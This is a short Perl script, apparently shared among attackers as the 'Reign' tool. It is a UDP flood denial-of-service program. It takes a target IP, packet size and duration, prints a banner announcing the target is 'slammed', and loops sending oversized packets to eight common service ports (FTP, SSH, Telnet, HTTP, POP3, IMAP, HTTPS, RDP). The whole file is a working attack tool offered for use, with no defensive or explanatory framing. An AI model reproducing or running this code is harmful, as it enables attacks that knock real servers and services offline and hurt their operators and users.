###
# Private Script for Reign - Made By Long.Inetger
###

use Term::ANSIColor qw(:constants);
    $Term::ANSIColor::AUTORESET = 2;

use Socket;
use strict;

my ($ip,$size,$time) = @ARGV;
my ($iaddr,$endtime,$psize);
my $port1 = "21";
my $port2 = "22";
my $port3 = "23";
my $port4 = "80";
my $port5 = "110";
my $port6 = "143";
my $port7 = "443";
my $port8 = "3389";
$endtime = time() + ($time ? $time : 100);
$iaddr = inet_aton("$ip") or die "Cannot resolve hostname $ip\n";

socket(flood, PF_INET, SOCK_DGRAM, 17);
print BOLD RED<<EOTEXT;
    ______        _               
    | ___ \      (_)              
    | |_/ /  ___  _   __ _  _ __  
    |    /  / _ \| | / _` || '_ \ 
    | |\ \ |  __/| || (_| || | | |
    \_| \_| \___||_| \__, ||_| |_|
                      __/ |       
                     |___/  

	Reign Slammed $ip
	For $time Seconds
EOTEXT
for (;time() <= $endtime;) {
  $psize = $size ? $size : int(rand(42000000-69)+69) ;
 
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port1,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port2,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port3,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port4,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port5,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port6,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port7,
$iaddr));
send(flood, pack("a$psize","Re1gn"), 0, pack_sockaddr_in($port8,
$iaddr));
}